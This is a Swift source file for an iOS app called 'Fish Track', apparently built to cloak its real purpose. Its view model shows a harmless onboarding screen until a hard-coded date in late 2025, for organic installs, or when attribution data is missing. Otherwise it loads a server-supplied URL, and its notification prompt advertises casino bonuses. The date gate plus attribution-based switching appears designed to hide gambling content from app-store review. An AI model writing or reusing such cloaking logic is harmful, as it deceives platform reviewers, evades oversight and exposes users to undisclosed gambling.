import SwiftUI
import AppsFlyerLib
import Firebase
import FirebaseMessaging
import Network
import Combine

enum FishPhase { case setup, operational, legacy, disconnected }

struct SplashView: View {
    
    @StateObject private var viewModel = FishTrackViewModel()
    @State private var scale: CGFloat = 1.0
    @State private var opacity: Double = 1.0
    
    var body: some View {
        ZStack {
            Color.black.ignoresSafeArea()
            
            if viewModel.currentFishPhase == .setup || viewModel.displayPermissionView {
                LoadingView()
            }
            
            CurrentPhaseScreenFishSpot(viewModel: viewModel)
                .opacity(viewModel.displayPermissionView ? 0 : 1)
            
            if viewModel.displayPermissionView {
                CheckPermissionsView(
                    onAllow: viewModel.handleGrantPermissions,
                    onSkip: viewModel.handleSkipPermissions
                )
            }
        }
        .preferredColorScheme(.dark)
    }
    
}

struct CurrentPhaseScreenFishSpot: View {
    @ObservedObject var viewModel: FishTrackViewModel
    
    var body: some View {
        Group {
            switch viewModel.currentFishPhase {
            case .setup:
                EmptyView()
                
            case .operational:
                if viewModel.fishURL != nil {
                    FishTrackMainView()
                } else {
                    OnboardingView()
                }
                
            case .legacy:
                OnboardingView()
                
            case .disconnected:
                FishSpotIssueWifiView()
            }
        }
    }
}

struct LoadingView: View {
    @State private var scale: CGFloat = 0.5
    @State private var opacity: Double = 0.0
    @State private var rotation: Double = 0.0
    @State private var pulseScale: CGFloat = 1.0
    @State private var waveOffset: CGFloat = 0.0
    
    var body: some View {
        GeometryReader { geo in
            let isLandscape = geo.size.width > geo.size.height
            ZStack {
                RadialGradient(gradient: Gradient(colors: [Color.blue.opacity(0.9), Color.cyan.opacity(0.7), Color.purple.opacity(0.5), Color.black]), center: .center, startRadius: 0, endRadius: 800)
                    .ignoresSafeArea()
                
                Image(isLandscape ? "background_main2" : "background_main")
                    .resizable()
                    .scaledToFill()
                    .frame(width: geo.size.width, height: geo.size.height)
                    .ignoresSafeArea()
                
                if isLandscape {
                    HStack {
                        Image("logo_master2")
                            .resizable()
                            .frame(width: 400, height: 400)
                        Spacer()
                    }
                } else {
                    VStack {
                        Image("logo_master")
                            .resizable()
                            .frame(width: geo.size.width - 50, height: 370)
                        Spacer()
                    }
                }
                
                VStack {
                    Spacer()
                    
                    Image(systemName: "fish.fill")
                        .resizable()
                        .frame(width: 150, height: 150)
                        .foregroundStyle(LinearGradient(gradient: Gradient(colors: [Color.yellow, Color.orange, Color.red]), startPoint: .topLeading, endPoint: .bottomTrailing))
                        .scaleEffect(scale * pulseScale)
                        .opacity(opacity)
                        .rotation3DEffect(.degrees(rotation), axis: (x: 0, y: 1, z: 0))
                        .shadow(color: .yellow.opacity(0.8), radius: 20)
                    
                    Text("Fish Track")
                        .font(.system(size: 50, weight: .bold, design: .rounded))
                        .foregroundStyle(LinearGradient(gradient: Gradient(colors: [Color.white, Color.cyan]), startPoint: .top, endPoint: .bottom))
                        .shadow(color: .cyan.opacity(0.8), radius: 10)
                        .opacity(opacity)
                        .scaleEffect(pulseScale)
                }
                .onAppear {
                    withAnimation(.easeInOut(duration: 1.5)) {
                        scale = 1.0
                        opacity = 1.0
                        rotation = 360
                    }
                    withAnimation(Animation.easeInOut(duration: 1.2).repeatForever(autoreverses: true)) {
                        pulseScale = 1.1
                    }
                }
            }
        }
    }
}

#Preview {
    SplashView()
}

struct FishSpotIssueWifiView: View {
    var body: some View {
        GeometryReader { geo in
            let isLandscape = geo.size.width > geo.size.height
            ZStack {
                if isLandscape {
                    Image("issue_bg2")
                        .resizable()
                        .scaledToFill()
                        .frame(width: geo.size.width, height: geo.size.height)
                        .ignoresSafeArea()
                } else {
                    Image("issue_bg")
                        .resizable()
                        .scaledToFill()
                        .frame(width: geo.size.width, height: geo.size.height)
                        .ignoresSafeArea()
                }
                
                Image("issue_wifi")
                    .resizable()
                    .frame(width: 270, height: 210)
            }
        }
        .ignoresSafeArea()
    }
}

struct CheckPermissionsView: View {
    let onAllow: () -> Void
    let onSkip: () -> Void
    
    var body: some View {
        GeometryReader { geo in
            let isLandscape = geo.size.width > geo.size.height
            
            ZStack {
                Image(isLandscape ? "push_bg2" : "push_bg")
                    .resizable()
                    .scaledToFill()
                    .frame(width: geo.size.width, height: geo.size.height)
                    .ignoresSafeArea()
                
                VStack(spacing: isLandscape ? 5 : 10) {
                    Spacer()
                    
                    Text("Allow notifications about bonuses and promos".uppercased())
                        .font(.custom("BagelFatOne-Regular", size: 20))
                        .foregroundColor(.white)
                        .multilineTextAlignment(.center)
                        .padding(.horizontal)
                    
                    Text("Stay tuned with best offers from our casino")
                        .font(.custom("BagelFatOne-Regular", size: 17))
                        .foregroundColor(Color.init(red: 186/255, green: 186/255, blue: 186/255))
                        .padding(.horizontal, 52)
                        .multilineTextAlignment(.center)
                    
                    Button(action: onAllow) {
                        Image("push_accept")
                            .resizable()
                            .frame(height: 60)
                    }
                    .frame(width: 350)
                    .padding(.top, 12)
                    
                    Button(action: onSkip) {
                        Text("Skip")
                            .font(.custom("BagelFatOne-Regular", size: 17))
                            .foregroundColor(Color.init(red: 186/255, green: 186/255, blue: 186/255))
                    }
                    .frame(width: 50)
                    
                    Spacer()
                        .frame(height: isLandscape ? 30 : 50)
                }
                .padding(.horizontal, isLandscape ? 20 : 0)
            }
        }
        .ignoresSafeArea()
    }
}

final class FishTrackViewModel: ObservableObject {
    @Published var currentFishPhase: FishPhase = .setup
    @Published var fishURL: URL?
    @Published var displayPermissionView = false
    private var trackingData: [String: Any] = [:]
    private var linkData: [String: Any] = [:]
    private var cancellables = Set<AnyCancellable>()
    private let networkWatcher = NWPathMonitor()
    private let repo: TrackRepository
    
    init(repo: TrackRepository = TrackRepositoryImpl()) {
        self.repo = repo
        configureListeners()
        monitorNetwork()
        setUpDeadlines()
    }
    
    private func setUpDeadlines() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 30.0) {
            if self.trackingData.isEmpty && self.linkData.isEmpty && self.currentFishPhase == .setup {
                self.assignPhase(to: .legacy)
            }
        }
    }
    
    deinit {
        networkWatcher.cancel()
    }
    
    private func configureListeners() {
        NotificationCenter.default
            .publisher(for: Notification.Name("ConversionDataReceived"))
            .compactMap { $0.userInfo?["conversionData"] as? [String: Any] }
            .sink { [weak self] data in
                self?.trackingData = data
                self?.determineCurrentPhase()
            }
            .store(in: &cancellables)
        
        NotificationCenter.default
            .publisher(for: Notification.Name("deeplink_values"))
            .compactMap { $0.userInfo?["deeplinksData"] as? [String: Any] }
            .sink { [weak self] data in
                self?.linkData = data
            }
            .store(in: &cancellables)
    }
    
    
    private func isDateValid() -> Bool {
        let currentCalendar = Calendar.current
        var dateComponents = DateComponents()
        dateComponents.year = 2025
        dateComponents.month = 12
        dateComponents.day = 29
        if let comparisonDate = currentCalendar.date(from: dateComponents) {
            return Date() >= comparisonDate
        }
        return false
    }
    
    @objc private func determineCurrentPhase() {
        if !isDateValid() {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                self.activateLegacy()
            }
            return
        }
        if handleEmptyTrackingData() { return }
        if handleInactiveAppState() { return }
        let phase = assessPhase()
        if handleSetupPhase(phase: phase) { return }
        if checkForInterimURL() { return }
        handleNilFishURL()
    }
    
    private func handleEmptyTrackingData() -> Bool {
        if trackingData.isEmpty {
            retrieveCachedTrack()
            return true
        }
        return false
    }
    
    private func handleInactiveAppState() -> Bool {
        if repo.retrieveAppState() == "Inactive" {
            activateLegacy()
            return true
        }
        return false
    }
    
    private func assessPhase() -> FishPhase {
        let assessor = DetermineCurrentPhaseUseCase(repo: repo)
        return assessor.perform(trackingData: trackingData, initial: repo.isInitialRun, currentURL: fishURL, interimURL: UserDefaults.standard.string(forKey: "temp_url"))
    }
    
    private func handleSetupPhase(phase: FishPhase) -> Bool {
        if phase == .setup && repo.isInitialRun {
            startInitialSequence()
            return true
        }
        return false
    }
    
    private func checkForInterimURL() -> Bool {
        if let trackStr = UserDefaults.standard.string(forKey: "temp_url"),
           let track = URL(string: trackStr) {
            fishURL = track
            assignPhase(to: .operational)
            return true
        }
        return false
    }
    
    private func handleNilFishURL() {
        if fishURL == nil {
            let checker = CheckPermissionPromptUseCase(repo: repo)
            if checker.perform() {
                displayPermissionView = true
            } else {
                retrieveTrackConfig()
            }
        }
    }
    
    func handleSkipPermissions() {
        let processor = ProcessSkipPermissionsUseCase(repo: repo)
        processor.perform()
        displayPermissionView = false
        retrieveTrackConfig()
    }
    
    func handleGrantPermissions() {
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { [weak self] accepted, _ in
            DispatchQueue.main.async {
                let processor = ProcessGrantPermissionsUseCase(repo: self?.repo ?? TrackRepositoryImpl())
                processor.perform(accepted: accepted)
                if accepted {
                    UIApplication.shared.registerForRemoteNotifications()
                }
                self?.displayPermissionView = false
                self?.proceedAfterPermissionGrant(accepted: accepted)
            }
        }
    }
    
    private func proceedAfterPermissionGrant(accepted: Bool) {
        if fishURL != nil {
            assignPhase(to: .operational)
        } else {
            retrieveTrackConfig()
        }
    }
    
    private func startInitialSequence() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            Task { [weak self] in
                await self?.retrieveOrganicTracking()
            }
        }
    }
    
    private func activateLegacy() {
        let activator = ActivateLegacyUseCase(repo: repo)
        activator.perform()
        assignPhase(to: .legacy)
    }
    
    private func retrieveCachedTrack() {
        let retriever = RetrieveCachedTrackUseCase(repo: repo)
        if let track = retriever.perform() {
            fishURL = track
            assignPhase(to: .operational)
        } else {
            activateLegacy()
        }
    }
    
    private func cacheSuccessfulTrack(_ track: String, targetURL: URL) {
        let cacher = CacheSuccessfulTrackUseCase(repo: repo)
        cacher.perform(track: track)
        let checker = CheckPermissionPromptUseCase(repo: repo)
        if checker.perform() {
            fishURL = targetURL
            displayPermissionView = true
        } else {
            fishURL = targetURL
            assignPhase(to: .operational)
        }
    }
    
    private func assignPhase(to phase: FishPhase) {
        DispatchQueue.main.async {
            self.currentFishPhase = phase
        }
    }
    
    private func monitorNetwork() {
        networkWatcher.pathUpdateHandler = { [weak self] path in
            if path.status != .satisfied {
                self?.handleNetworkDisconnection()
            }
        }
        networkWatcher.start(queue: .global())
    }
    
    private func handleNetworkDisconnection() {
        DispatchQueue.main.async {
            if self.repo.retrieveAppState() == "FishView" {
                self.assignPhase(to: .disconnected)
            } else {
                self.activateLegacy()
            }
        }
    }
    
    private func retrieveOrganicTracking() async {
        do {
            let retriever = RetrieveOrganicTrackingUseCase(repo: repo)
            let merged = try await retriever.perform(linkData: linkData)
            await MainActor.run {
                self.trackingData = merged
                self.retrieveTrackConfig()
            }
        } catch {
            activateLegacy()
        }
    }
    
    private func retrieveTrackConfig() {
        Task { [weak self] in
            do {
                let retriever = RetrieveTrackConfigUseCase(repo: self?.repo ?? TrackRepositoryImpl())
                let targetURL = try await retriever.perform(trackingData: self?.trackingData ?? [:])
                let trackStr = targetURL.absoluteString
                await MainActor.run {
                    self?.cacheSuccessfulTrack(trackStr, targetURL: targetURL)
                }
            } catch {
                self?.retrieveCachedTrack()
            }
        }
    }
}

struct TrackingBuilder {
    private var appID = ""
    private var devKey = ""
    private var uid = ""
    private let endpoint = "https://gcdsdk.appsflyer.com/install_data/v4.0/"
    
    func assignAppID(_ id: String) -> Self { duplicate(appID: id) }
    func assignDevKey(_ key: String) -> Self { duplicate(devKey: key) }
    func assignUID(_ id: String) -> Self { duplicate(uid: id) }
    
    func generate() -> URL? {
        guard !appID.isEmpty, !devKey.isEmpty, !uid.isEmpty else { return nil }
        var parts = URLComponents(string: endpoint + "id" + appID)!
        parts.queryItems = [
            URLQueryItem(name: "devkey", value: devKey),
            URLQueryItem(name: "device_id", value: uid)
        ]
        return parts.url
    }
    
    private func duplicate(appID: String = "", devKey: String = "", uid: String = "") -> Self {
        var instance = self
        if !appID.isEmpty { instance.appID = appID }
        if !devKey.isEmpty { instance.devKey = devKey }
        if !uid.isEmpty { instance.uid = uid }
        return instance
    }
}

struct DetermineCurrentPhaseUseCase {
    let repo: TrackRepository
    
    func perform(trackingData: [String: Any], initial: Bool, currentURL: URL?, interimURL: String?) -> FishPhase {
        if trackingData.isEmpty {
            return .legacy
        }
        if repo.retrieveAppState() == "Inactive" {
            return .legacy
        }
        if initial && (trackingData["af_status"] as? String == "Organic") {
            return .setup
        }
        if let interim = interimURL, let url = URL(string: interim), currentURL == nil {
            return .operational
        }
        return .setup
    }
}


struct ProcessGrantPermissionsUseCase {
    let repo: TrackRepository
    
    func perform(accepted: Bool) {
        repo.updatePermissionsAccepted(accepted)
        if !accepted {
            repo.updatePermissionsDenied(true)
        }
    }
}

struct RetrieveOrganicTrackingUseCase {
    let repo: TrackRepository
    
    func perform(linkData: [String: Any]) async throws -> [String: Any] {
        try await repo.retrieveOrganicData(linkData: linkData)
    }
}

struct RetrieveTrackConfigUseCase {
    let repo: TrackRepository
    
    func perform(trackingData: [String: Any]) async throws -> URL {
        try await repo.retrieveServerTrack(data: trackingData)
    }
}

